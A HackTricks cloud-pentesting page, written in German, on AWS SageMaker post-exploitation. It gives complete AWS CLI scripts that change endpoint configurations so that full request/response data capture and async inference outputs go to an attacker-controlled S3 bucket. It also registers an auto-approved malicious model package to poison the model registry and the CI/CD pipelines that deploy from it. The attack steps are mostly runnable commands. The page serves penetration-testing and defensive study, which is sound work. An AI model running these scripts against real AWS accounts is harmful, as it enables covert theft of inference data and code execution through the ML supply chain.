# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint data siphon via UpdateEndpoint DataCaptureConfig

Missbrauch des SageMaker-Endpoint-Managements, um die vollständige Erfassung von Requests/Responses in einen vom Angreifer kontrollierten S3-Bucket zu ermöglichen, ohne das Modell oder den Container anzufassen. Verwendet ein Zero-/Low‑Downtime-Rolling-Update und erfordert nur Berechtigungen für die Endpoint-Verwaltung.

### Anforderungen
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (oder verwende einen bestehenden Bucket im selben Account)
- Optional (bei Verwendung von SSE‑KMS): `kms:Encrypt` auf dem gewählten CMK
- Ziel: Ein bestehender InService real‑time endpoint im selben Account/Region

### Schritte
1) Identifiziere einen InService-Endpoint und sammle die aktuellen production variants
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) S3-Ziel des Angreifers für captures vorbereiten
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Erstelle eine neue EndpointConfig, die dieselben Varianten beibält, aber DataCapture zum attacker bucket aktiviert

Hinweis: Verwende explizite Content-Types, die die CLI-Validierung erfüllen.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Wende die neue Konfiguration mit einem rolling update an (minimale/keine Ausfallzeit)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Generiere mindestens einen Inferenz-Aufruf (optional, wenn Live-Traffic vorhanden ist)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Validieren Sie captures im Angreifer-S3
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Auswirkungen
- Vollständige exfiltration von Echtzeit-inference-Anfrage- und Antwort-Payloads (und Metadaten) vom zielgerichteten Endpoint in einen vom Angreifer kontrollierten S3-Bucket.
- Keine Änderungen am model/container image und nur Änderungen auf Endpoint-Ebene, wodurch ein unauffälliger Pfad für Datendiebstahl mit minimalen Betriebsstörungen ermöglicht wird.

## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Missbrauche die Endpoint-Verwaltung, um asynchrone inference-Ausgaben an einen vom Angreifer kontrollierten S3-Bucket umzuleiten, indem du die aktuelle EndpointConfig klonst und AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath setzt. Dies exfiltrates model predictions (und alle transformierten Inputs, die vom container eingeschlossen werden), ohne das model/container zu modifizieren.

### Anforderungen
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Schreibzugriff auf den vom Angreifer kontrollierten S3-Bucket (über die model execution role oder eine permissive bucket policy)
- Ziel: Ein InService-Endpoint, bei dem asynchrone invocations verwendet werden (oder verwendet werden sollen)

### Schritte
1) Sammle die aktuellen ProductionVariants vom Ziel-Endpoint
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Erstelle einen attacker bucket (stelle sicher, dass die model execution role PutObject darauf ausführen darf)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Klone EndpointConfig und hijack AsyncInference-Ausgaben in den attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Löse eine async invocation aus und überprüfe, dass Objekte im attacker S3 landen
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Auswirkung
- Leitet asynchrone Inference-Ergebnisse (und error bodies) an attacker-controlled S3 weiter, wodurch covert exfiltration von predictions und potenziell sensiblen pre/post-processed inputs, die vom container erzeugt werden, ermöglicht wird, ohne model code oder image zu ändern und mit minimaler/keiner Downtime.


## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Wenn ein attacker CreateModelPackage auf einer Ziel SageMaker Model Package Group ausführen kann, kann er eine neue Modellversion registrieren, die auf ein attacker-controlled container image zeigt und diese sofort als Approved markieren. Viele CI/CD-Pipelines auto-deploy Approved model versions zu endpoints oder training jobs, was in attacker code execution unter den service’s execution roles resultiert. Cross-account exposure kann durch eine permissive ModelPackageGroup resource policy verstärkt werden.

### Anforderungen
- IAM (minimum to poison an existing group): `sagemaker:CreateModelPackage` on the target ModelPackageGroup
- Optional (to create a group if one doesn’t exist): `sagemaker:CreateModelPackageGroup`
- S3: Lesezugriff auf die referenzierte ModelDataUrl (oder host attacker-controlled artifacts)
- Ziel: Eine Model Package Group, die von downstream automation nach Approved versions überwacht wird

### Schritte
1) Region setzen und eine Ziel Model Package Group erstellen/finden
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Bereite Dummy-Modell-Daten in S3 vor
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Registrieren Sie eine bösartige (hier harmlos) Approved model package version, die auf ein öffentliches AWS DLC image verweist
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Überprüfen Sie, dass die neue genehmigte Version existiert.
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Auswirkungen
- Das Model Registry mit einer Approved-Version vergiften, die auf vom Angreifer kontrollierten Code verweist. Pipelines, die Approved-Modelle automatisch deployen, können das Angreifer-Image ziehen und ausführen, was zur Ausführung von Code unter den endpoint-/training-Rollen führt.
- Mit einer zu permissiven ModelPackageGroup resource policy (PutModelPackageGroupPolicy) kann dieser Missbrauch kontoübergreifend ausgelöst werden.

## Feature store poisoning

Missbrauche `sagemaker:PutRecord` auf einer Feature Group mit aktiviertem OnlineStore, um Live-Feature-Werte zu überschreiben, die von Online-Inference genutzt werden. In Kombination mit `sagemaker:GetRecord` kann ein Angreifer sensible Features auslesen. Dafür ist kein Zugriff auf Modelle oder Endpoints erforderlich.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
{{#include ../../../../banners/hacktricks-training.md}}
